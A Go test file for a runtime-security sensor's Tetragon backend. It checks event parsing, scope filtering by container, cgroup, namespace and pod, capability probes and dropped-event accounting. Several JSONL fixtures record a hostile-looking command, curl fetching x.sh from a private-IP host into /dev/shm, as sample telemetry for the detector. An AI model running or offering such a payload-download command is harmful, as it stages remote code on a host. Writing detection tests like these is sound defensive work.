package tetragon

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	sensorv1 "github.com/sysarmor/sysarmor-next-project/packages/contracts/proto/sensor/v1"
	"github.com/sysarmor/sysarmor-next-project/packages/sensor-sdk/contract"
)

func TestBackendSubscribesJSONLFile(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("apiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	if err := os.WriteFile(eventPath, []byte(raw+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{ObserveOnly: true})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		if ev.RawRef == "" || ev.SensorEvent.GetRawRef() == "" {
			t.Fatalf("raw ref was not populated: %+v", ev)
		}
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 2 || got[0] != "process.exec" || got[1] != "file.write" {
		t.Fatalf("got behaviors %v, want process.exec, file.write", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if !health.PolicyLoaded || health.EventsSeen != 2 {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendFiltersProcessLifecycleByCollectionIntent(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawExec := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","flags":"execve clone","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawExit := `{"process_exit":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawExec+"\n"+rawExit+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		Behaviors: []string{"process.fork"},
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 1 || got[0] != "process.fork" {
		t.Fatalf("got behaviors %v, want only process.fork", got)
	}
}

func TestCapabilityReportsHostProbeFields(t *testing.T) {
	dir := t.TempDir()
	btfPath := filepath.Join(dir, "vmlinux")
	if err := os.WriteFile(btfPath, []byte("btf"), 0o644); err != nil {
		t.Fatal(err)
	}
	bpffsPath := filepath.Join(dir, "bpf")
	if err := os.Mkdir(bpffsPath, 0o755); err != nil {
		t.Fatal(err)
	}
	tetraPath := filepath.Join(dir, "tetra")
	if err := os.WriteFile(tetraPath, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle("policy.yaml", "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	backend.BTFPath = btfPath
	backend.BPFFSPath = bpffsPath
	backend.RequireBTF = true
	backend.RequireBPFFS = true
	capability, err := backend.Capability(context.Background())
	if err != nil {
		t.Fatalf("Capability() error = %v", err)
	}
	if capability.KernelRelease == "" || !capability.BTFAvailable || !capability.BPFFSAvailable {
		t.Fatalf("capability = %+v", capability)
	}
	if !capabilityHasField(capability.Collection, "network.connect", "socket.port") {
		t.Fatalf("collection capability missing network.connect socket.port: %+v", capability.Collection)
	}
	if !capabilityHasPushdownSelector(capability.Collection, "process.exec", "scope.namespace") {
		t.Fatalf("collection capability should push down namespace scope: %+v", capability.Collection)
	}
	if capabilityHasAgentSideSelector(capability.Collection, "process.exec", "scope.namespace") {
		t.Fatalf("collection capability should not mark namespace scope agent-side: %+v", capability.Collection)
	}
}

func capabilityHasField(items []contract.CollectionBehaviorCapability, behavior, field string) bool {
	for _, item := range items {
		if item.Behavior != behavior {
			continue
		}
		for _, got := range item.Fields {
			if got == field {
				return true
			}
		}
	}
	return false
}

func capabilityHasPushdownSelector(items []contract.CollectionBehaviorCapability, behavior, selector string) bool {
	for _, item := range items {
		if item.Behavior != behavior {
			continue
		}
		for _, got := range item.PushdownSelectors {
			if got == selector {
				return true
			}
		}
	}
	return false
}

func capabilityHasAgentSideSelector(items []contract.CollectionBehaviorCapability, behavior, selector string) bool {
	for _, item := range items {
		if item.Behavior != behavior {
			continue
		}
		for _, got := range item.AgentSideSelectors {
			if got == selector {
				return true
			}
		}
	}
	return false
}

func TestCapabilityFailsWhenRequiredBTFMissing(t *testing.T) {
	backend := NewBackend("policy.yaml", "events.jsonl", "test")
	backend.BTFPath = filepath.Join(t.TempDir(), "missing-vmlinux")
	backend.RequireBTF = true
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "btf unavailable") {
		t.Fatalf("Capability() error = %v, want btf unavailable", err)
	}
	health, healthErr := backend.Health(context.Background())
	if healthErr != nil {
		t.Fatalf("Health() error = %v", healthErr)
	}
	if !strings.Contains(health.LastError, "btf unavailable") {
		t.Fatalf("health = %+v", health)
	}
}

func TestCapabilityFailsWhenRequiredBPFFSMissing(t *testing.T) {
	backend := NewBackend("policy.yaml", "events.jsonl", "test")
	backend.BPFFSPath = filepath.Join(t.TempDir(), "missing-bpffs")
	backend.RequireBPFFS = true
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "bpffs unavailable") {
		t.Fatalf("Capability() error = %v, want bpffs unavailable", err)
	}
	health, healthErr := backend.Health(context.Background())
	if healthErr != nil {
		t.Fatalf("Health() error = %v", healthErr)
	}
	if !strings.Contains(health.LastError, "bpffs unavailable") {
		t.Fatalf("health = %+v", health)
	}
}

func TestCapabilityFailsWhenConfiguredBinaryNotExecutable(t *testing.T) {
	dir := t.TempDir()
	tetraPath := filepath.Join(dir, "tetra")
	if err := os.WriteFile(tetraPath, []byte("not executable"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle("policy.yaml", "", "test", BundleConfig{TetraPath: tetraPath})
	_, err := backend.Capability(context.Background())
	if err == nil || !strings.Contains(err.Error(), "not executable") {
		t.Fatalf("Capability() error = %v, want not executable", err)
	}
}

func TestBackendFiltersByContainerScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawHost := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":""},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"abcdef0123456789"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawHost+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "container",
		ScopeSelector: "abcdef",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetContainerId() != "abcdef0123456789" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendFiltersByCgroupScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-cgroup"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"kubepods.slice/workload-a.scope"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "cgroup",
		ScopeSelector: "kubepods.slice/workload-a",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetProc().GetCgroup() != "kubepods.slice/workload-a.scope" {
			t.Fatalf("cgroup = %q", ev.SensorEvent.GetProc().GetCgroup())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendFiltersByNamespaceScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-cgroup"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"kubepods.slice/pod-a.scope"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "namespace",
		ScopeSelector: "kubepods.slice/pod-a",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetProc().GetCgroup() != "kubepods.slice/pod-a.scope" {
			t.Fatalf("cgroup = %q", ev.SensorEvent.GetProc().GetCgroup())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendNamespaceSelfFiltersSiblingContainer(t *testing.T) {
	backend := &Backend{
		ScopeType:                "namespace",
		ScopeSelector:            "self",
		namespaceSelfContainerID: "abcdef0123456789",
		intent: contract.CollectionIntent{NamespaceSelectors: []contract.NamespaceSelector{
			{Namespace: "Pid", Values: []string{"4026533001"}},
		}},
	}
	self := &sensorv1.SensorEvent{ContainerId: "abcdef0123456789"}
	sibling := &sensorv1.SensorEvent{ContainerId: "fedcba9876543210"}
	if !backend.matchesScope(self) {
		t.Fatal("namespace/self rejected its own container event")
	}
	if backend.matchesScope(sibling) {
		t.Fatal("namespace/self accepted a sibling container event")
	}
}

func TestContainerIDFromCgroup(t *testing.T) {
	tests := map[string]string{
		"docker systemd": "0::/system.slice/docker-2e13a1fa7bec4aa1882f1b1e6645ca7135186249de2e955eaa2705391ae1927f.scope\n",
		"containerd":     "0::/kubepods.slice/cri-containerd-a4e1ca8ef3d4c02c7b28d835a97fa4e59e0be83f23443138bcaa1234567890ab.scope\n",
	}
	for name, data := range tests {
		t.Run(name, func(t *testing.T) {
			if got := containerIDFromCgroup(data); len(got) != 64 {
				t.Fatalf("containerIDFromCgroup() = %q, want 64-character ID", got)
			}
		})
	}
}

func TestBackendFiltersByPodScope(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	rawOther := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":"other-pod"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"pod-a-abcdef"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
	if err := os.WriteFile(eventPath, []byte(rawOther+"\n"+rawNode+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{
		ScopeType:     "pod",
		ScopeSelector: "pod-a",
	})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
		if ev.SensorEvent.GetContainerId() != "pod-a-abcdef" {
			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
		}
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want one process.exec", got)
	}
}

func TestBackendRecordsDroppedEvents(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(eventPath, []byte("{\"health\":{\"dropped_events\":5}}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsDropped != 5 || !strings.Contains(health.LastError, "dropped events") {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandSubscribesStdout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed event command test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nwhile [ $# -gt 0 ]; do shift; done\nsleep 5\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	backend.EventTransport = "tetra"
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want process.exec", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.RestartCount != 2 || health.LastExitReason == "" {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandRecordsDroppedEvents(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed dropped-event test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nif [ \"$1 $2\" = \"tracingpolicy add\" ]; then exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy list\" ]; then printf '%s\\n' 'sysarmor-runtime-collection'; exit 0; fi\nif [ \"$1 $2\" = \"tracingpolicy delete\" ]; then exit 0; fi\nprintf '%s\\n' '{\"health\":{\"dropped_events\":2}}'\nprintf '%s\\n' '" + raw + "'\nprintf '%s\\n' '{\"dropped_events\":3}'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath})
	backend.EventTransport = "tetra"
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{Behaviors: []string{"process.exec"}})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []string
	for ev := range events {
		got = append(got, ev.SensorEvent.GetBehavior())
	}
	if len(got) != 1 || got[0] != "process.exec" {
		t.Fatalf("got behaviors %v, want process.exec", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.EventsDropped != 5 || health.ParseErrors != 0 || !strings.Contains(health.LastError, "dropped events") {
		t.Fatalf("health = %+v", health)
	}
}
